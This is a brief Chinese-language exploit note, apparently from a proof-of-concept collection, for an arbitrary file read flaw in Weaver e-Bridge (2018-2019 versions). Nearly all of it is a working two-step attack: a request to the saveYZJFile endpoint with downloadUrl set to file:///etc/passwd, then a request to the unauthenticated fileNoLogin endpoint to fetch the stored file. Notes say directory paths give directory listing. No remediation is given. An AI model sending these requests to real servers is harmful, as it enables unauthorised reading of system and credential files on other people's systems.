# 泛微云桥任意文件读取



## #影响范围

主要影响 2018-2019 版本

## #Poc

```
http://x.x.x.x/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt
```

响应包提取id值重发

```
http://x.x.x.x/file/fileNoLogin/{id}
```

- downloadUrl参数填写文件的绝对路径时，可以造成任意文件读取
- downloadUrl参数填写目录的绝对路径时，可以造成目录遍历